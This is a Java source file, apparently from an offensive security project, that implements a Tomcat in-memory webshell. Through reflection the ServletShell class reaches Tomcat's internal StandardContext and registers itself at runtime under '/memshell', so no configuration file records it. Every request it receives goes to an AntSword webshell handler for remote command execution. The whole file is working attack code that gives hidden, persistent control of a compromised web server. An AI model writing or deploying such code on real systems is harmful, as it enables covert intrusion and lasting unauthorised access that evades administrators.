package com.spkiddai.memoryserver.Shell;

import com.spkiddai.memoryserver.Tools.AntSwordTool;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;


public class ServletShell implements Servlet {

    String serveltpattern = "/memshell";

    // 初始化方法
    public void init(ServletConfig servletConfig) throws ServletException {
    }

    // 获取ServletConfig配置信息
    public ServletConfig getServletConfig() {
        return null;
    }

    // 提供服务的核心方法
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;
        AntSwordTool antswordUtil = new AntSwordTool();
        antswordUtil.exec(request,response);
    }

    // 获取Servlet信息
    public String getServletInfo() {
        return null;
    }

    // 销毁方法
    public void destroy() {
    }

    /**
     * 向Tomcat注册Servlet
     *
     * @param request HttpServletRequest请求对象
     */
    public void addServlet(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();

        if (servletContext.getServletRegistration(this.getClass().getSimpleName()) == null) {
            StandardContext context = getContext(servletContext);

            // 创建ServletTest实例
            Servlet servletClass = new ServletShell();

            // 创建Wrapper，设置属性
            Wrapper wrapper = context.createWrapper();
            wrapper.setName(this.getClass().getSimpleName());
            wrapper.setLoadOnStartup(1);
            wrapper.setServlet(servletClass);
            wrapper.setServletClass(this.toString());

            //添加Wrapper和映射
            context.addChild(wrapper);
            context.addServletMappingDecoded(serveltpattern, this.getClass().getSimpleName());
        }
    }

    /**
     * 从ServletContext中获取StandardContext对象
     *
     * @param servletContext Servlet上下文对象
     * @return 返回StandardContext对象
     */
    public static StandardContext getContext(ServletContext servletContext) throws Exception {
        StandardContext context = null;

        while (context == null) {
            Field f = servletContext.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object object = f.get(servletContext);

            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                context = (StandardContext) object;
            }
        }
        return context;
    }
}
